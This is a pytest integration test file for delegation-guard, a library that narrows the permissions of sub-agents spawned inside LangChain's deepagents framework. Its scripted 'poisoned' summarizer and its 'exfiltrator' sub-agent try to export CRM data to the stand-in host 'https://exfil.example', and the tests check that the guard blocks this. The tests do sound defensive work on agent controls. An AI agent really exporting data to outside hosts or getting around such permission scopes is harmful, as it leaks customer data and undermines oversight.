"""delegation-guard × deepagents — integration tests.

`deepagents` (LangChain's "deep agents" package) is a REAL multi-agent
application built on LangGraph: an orchestrator agent spawns sub-agents by
calling a built-in `task(description, subagent_type)` tool, which invokes a
separately-compiled `create_agent` graph in-process.

These tests wire delegation-guard into both hook points:

  * DELEGATION — the parent's `task` tool call is intercepted; a child Guard
    is minted with `parent.delegate(...)` and made the active Guard for the
    duration of the sub-agent's run.
  * TOOL CALL — every sub-agent tool call is authorized against that child
    Guard before the tool body runs.

Both run through the framework's own `wrap_tool_call` middleware hook — no
monkeypatching. Driven by a scripted offline chat model: no API key, no
network. Skips cleanly when deepagents isn't installed.
"""
from __future__ import annotations

import importlib.util
import sys
from pathlib import Path

import pytest

pytest.importorskip("deepagents")
pytest.importorskip("langgraph")

from langchain_core.language_models.chat_models import BaseChatModel  # noqa: E402
from langchain_core.messages import AIMessage, ToolMessage  # noqa: E402
from langchain_core.outputs import ChatGeneration, ChatResult  # noqa: E402
from langchain_core.tools import tool  # noqa: E402

from deepagents import create_deep_agent  # noqa: E402

from delegation_guard import (  # noqa: E402
    AuditLog,
    Authority,
    EgressRank,
    Guard,
    RowLimit,
)

_ADAPTER_PATH = (
    Path(__file__).resolve().parents[2]
    / "examples" / "integrations" / "langgraph" / "dg_langgraph.py"
)


def _load_adapter():
    spec = importlib.util.spec_from_file_location("dg_langgraph_example", _ADAPTER_PATH)
    module = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


dg_langgraph = _load_adapter()
GuardedDelegation = dg_langgraph.GuardedDelegation
ToolPolicy = dg_langgraph.ToolPolicy


class ScriptedToolModel(BaseChatModel):
    """Replays a fixed list of AIMessages. No API key, no network."""

    responses: list
    i: int = 0

    def _generate(self, messages, stop=None, run_manager=None, **kwargs) -> ChatResult:
        message = self.responses[min(self.i, len(self.responses) - 1)]
        self.i += 1
        return ChatResult(generations=[ChatGeneration(message=message)])

    def bind_tools(self, tools, **kwargs):  # noqa: ANN001
        return self

    @property
    def _llm_type(self) -> str:
        return "scripted-tool-model"


def _call(name: str, args: dict, call_id: str) -> AIMessage:
    return AIMessage(content="", tool_calls=[{"name": name, "args": args, "id": call_id}])


def _task(subagent_type: str, description: str, call_id: str) -> AIMessage:
    return _call("task", {"description": description, "subagent_type": subagent_type}, call_id)


# --------------------------------------------------------------------------
# Authorities. The orchestrator can read AND export CRM data and write files;
# the summarizer sub-agent may only read, ≤5000 rows, with no egress.
# --------------------------------------------------------------------------
ORCHESTRATOR_AUTHORITY = Authority(
    scopes={"crm.*", "fs.*", "mail.send"},
    ceilings=[RowLimit(100_000), EgressRank("any")],
    ttl=3600,
)
SUMMARIZER_AUTHORITY = Authority(
    scopes={"crm.read", "fs.read"},
    ceilings=[RowLimit(5_000), EgressRank("none")],
    ttl=900,
)

# One policy map, shared by orchestrator and sub-agent: the *map* says which
# scope a tool needs, the *Guard* says whether this agent holds it. That is
# the whole point — same tools, attenuated authority.
POLICIES = {
    "crm_query": ToolPolicy("crm.read", lambda a: {"rows": a.get("rows", 0)}),
    "crm_export": ToolPolicy("crm.export", lambda a: {"egress": "any"}),
    "send_mail": ToolPolicy("mail.send", lambda a: {"egress": "any"}),
    # deepagents' built-in filesystem suite
    "ls": ToolPolicy("fs.read"),
    "glob": ToolPolicy("fs.read"),
    "grep": ToolPolicy("fs.read"),
    "read_file": ToolPolicy("fs.read"),
    "write_file": ToolPolicy("fs.write"),
    "edit_file": ToolPolicy("fs.write"),
    "delete": ToolPolicy("fs.delete"),
}


@pytest.fixture
def side_effects() -> list:
    return []


def _make_tools(side_effects: list):
    @tool
    def crm_query(rows: int) -> str:
        """Read `rows` rows from the CRM."""
        side_effects.append(("crm_query", rows))
        return f"{rows} CRM rows"

    @tool
    def crm_export(destination: str) -> str:
        """Export the CRM to an external destination."""
        side_effects.append(("crm_export", destination))
        return f"exported to {destination}"

    return crm_query, crm_export


def _build(side_effects: list, *, sub_script: list, parent_script: list,
           on_deny: str = "tool_error", register_exfiltrator: bool = False):
    """Compile a real deepagents orchestrator with one guarded sub-agent."""
    crm_query, crm_export = _make_tools(side_effects)

    root = Guard.issue("orchestrator", ORCHESTRATOR_AUTHORITY, task="root")
    guarded = GuardedDelegation(
        root,
        tools=POLICIES,
        subagents={"summarizer": SUMMARIZER_AUTHORITY},
        delegation_tool="task",
        subagent_arg="subagent_type",
        task_arg="description",
        on_deny=on_deny,
    )
    middleware = guarded.middleware()

    subagents = [{
        "name": "summarizer",
        "description": "Summarizes CRM data.",
        "system_prompt": "You summarize CRM data.",
        "model": ScriptedToolModel(responses=sub_script),
        "tools": [crm_query, crm_export],
        "middleware": [middleware],
    }]
    if register_exfiltrator:
        # deepagents happily registers this; delegation-guard is what stops it.
        subagents.append({
            "name": "exfiltrator",
            "description": "Exports CRM data anywhere.",
            "system_prompt": "You export data.",
            "model": ScriptedToolModel(responses=[
                _call("crm_export", {"destination": "https://exfil.example"}, "x1"),
                AIMessage(content="exfiltrated"),
            ]),
            "tools": [crm_query, crm_export],
            "middleware": [middleware],
        })

    agent = create_deep_agent(
        model=ScriptedToolModel(responses=parent_script),
        tools=[],
        subagents=subagents,
        middleware=[middleware],
    )
    return agent, root, guarded


# ==========================================================================
def test_task_spawn_mints_an_attenuated_child(side_effects):
    agent, root, guarded = _build(
        side_effects,
        parent_script=[_task("summarizer", "summarize Q3 pipeline", "t1"),
                       AIMessage(content="all done")],
        sub_script=[_call("crm_query", {"rows": 4200}, "c1"),
                    AIMessage(content="Q3 looks fine")],
    )
    agent.invoke({"messages": [("user", "summarize Q3 pipeline")]})

    child = guarded.child("summarizer")
    assert child is not None
    assert child.authority.is_narrower_than(root.authority)
    assert child.authority.scopes == frozenset({"crm.read", "fs.read"})
    assert child.authority.ceiling("max_rows").max_rows == 5_000
    assert child.authority.ceiling("egress").level == "none"
    assert ("crm_query", 4200) in side_effects

    spawns = [e for e in root.audit_log().entries if e["event"] == "spawn"]
    assert len(spawns) == 1
    assert spawns[0]["agent"] == "summarizer"
    assert spawns[0]["task"] == "summarize Q3 pipeline"


def test_poisoned_subagent_export_is_blocked_before_the_tool_body(side_effects):
    agent, root, guarded = _build(
        side_effects,
        parent_script=[_task("summarizer", "summarize Q3 pipeline", "t1"),
                       AIMessage(content="all done")],
        sub_script=[
            _call("crm_query", {"rows": 4200}, "c1"),
            # the poisoned step
            _call("crm_export", {"destination": "https://exfil.example"}, "c2"),
            AIMessage(content="summary complete"),
        ],
    )
    agent.invoke({"messages": [("user", "summarize Q3 pipeline")]})

    assert ("crm_query", 4200) in side_effects
    assert not any(e[0] == "crm_export" for e in side_effects)

    denies = [e for e in root.audit_log().entries if e["event"] == "deny"]
    assert [d["tool"] for d in denies] == ["crm_export"]
    assert denies[0]["reason"] == "scope_not_granted"
    assert denies[0]["node"] == guarded.child("summarizer").node_id


def test_subagent_cannot_write_files_although_the_orchestrator_can(side_effects):
    agent, root, guarded = _build(
        side_effects,
        parent_script=[_task("summarizer", "summarize Q3 pipeline", "t1"),
                       AIMessage(content="all done")],
        sub_script=[
            _call("write_file", {"file_path": "/notes.md", "content": "leak"}, "c1"),
            AIMessage(content="done"),
        ],
    )
    agent.invoke({"messages": [("user", "summarize Q3 pipeline")]})

    denies = [e for e in root.audit_log().entries if e["event"] == "deny"]
    assert [d["scope"] for d in denies] == ["fs.write"]
    # ...and the orchestrator itself WOULD have been allowed to do it.
    assert root.would_allow("fs.write")


def test_delegation_to_an_undeclared_subagent_is_refused(side_effects):
    agent, root, guarded = _build(
        side_effects,
        register_exfiltrator=True,
        parent_script=[_task("exfiltrator", "export everything", "t1"),
                       AIMessage(content="all done")],
        sub_script=[AIMessage(content="unused")],
    )
    out = agent.invoke({"messages": [("user", "export everything")]})

    # deepagents would have run it; delegation-guard never let it start.
    assert side_effects == []
    assert guarded.child("exfiltrator") is None
    denial = next(m for m in out["messages"]
                  if isinstance(m, ToolMessage) and m.status == "error")
    assert "exfiltrator" in denial.content


def test_revoked_orchestrator_cannot_spawn_a_subagent(side_effects):
    agent, root, guarded = _build(
        side_effects,
        parent_script=[_task("summarizer", "summarize Q3 pipeline", "t1"),
                       AIMessage(content="all done")],
        sub_script=[_call("crm_query", {"rows": 4200}, "c1"),
                    AIMessage(content="Q3 looks fine")],
    )
    root.revoke()   # cascade over the whole subtree

    out = agent.invoke({"messages": [("user", "summarize Q3 pipeline")]})

    assert side_effects == []
    assert guarded.child("summarizer") is None
    denial = next(m for m in out["messages"]
                  if isinstance(m, ToolMessage) and m.status == "error")
    assert "chain_revoked" in denial.content


def test_revocation_cascades_to_the_spawned_child(side_effects):
    agent, root, guarded = _build(
        side_effects,
        parent_script=[_task("summarizer", "summarize Q3 pipeline", "t1"),
                       AIMessage(content="all done")],
        sub_script=[_call("crm_query", {"rows": 4200}, "c1"),
                    AIMessage(content="Q3 looks fine")],
    )
    agent.invoke({"messages": [("user", "summarize Q3 pipeline")]})
    child = guarded.child("summarizer")
    assert child.check("crm.read", context={"rows": 10})

    root.revoke(child.node_id)
    decision = child.check("crm.read", context={"rows": 10})
    assert not decision
    assert decision.reasons[0].code == "revoked"


def test_audit_chain_verifies_end_to_end(side_effects):
    agent, root, guarded = _build(
        side_effects,
        parent_script=[_task("summarizer", "summarize Q3 pipeline", "t1"),
                       AIMessage(content="all done")],
        sub_script=[
            _call("crm_query", {"rows": 4200}, "c1"),
            _call("crm_export", {"destination": "https://exfil.example"}, "c2"),
            AIMessage(content="summary complete"),
        ],
    )
    agent.invoke({"messages": [("user", "summarize Q3 pipeline")]})

    entries = root.audit_log().entries
    ok, err = AuditLog.verify(entries)
    assert ok, err
    events = [e["event"] for e in entries]
    assert events[0] == "root"
    assert "spawn" in events and "allow" in events and "deny" in events

    # Tamper with one entry: verification must fail.
    tampered = [dict(e) for e in entries]
    for e in tampered:
        if e["event"] == "deny":
            e["event"] = "allow"
            break
    ok2, _ = AuditLog.verify(tampered)
    assert not ok2


def test_async_invoke_attenuates_and_blocks_the_poisoned_subagent(side_effects):
    """`ainvoke` must give the same answer as `invoke`: the delegation hook
    has to survive the async task boundary that carries contextvars into the
    spawned sub-agent's graph."""
    import asyncio

    agent, root, guarded = _build(
        side_effects,
        parent_script=[_task("summarizer", "summarize Q3 pipeline", "t1"),
                       AIMessage(content="all done")],
        sub_script=[
            _call("crm_query", {"rows": 4200}, "c1"),
            _call("crm_export", {"destination": "https://exfil.example"}, "c2"),
            AIMessage(content="summary complete"),
        ],
    )
    asyncio.run(agent.ainvoke({"messages": [("user", "summarize Q3 pipeline")]}))

    child = guarded.child("summarizer")
    assert child is not None
    assert child.authority.is_narrower_than(root.authority)
    assert ("crm_query", 4200) in side_effects
    assert not any(e[0] == "crm_export" for e in side_effects)

    denies = [e for e in root.audit_log().entries if e["event"] == "deny"]
    assert [d["tool"] for d in denies] == ["crm_export"]
    assert denies[0]["node"] == child.node_id
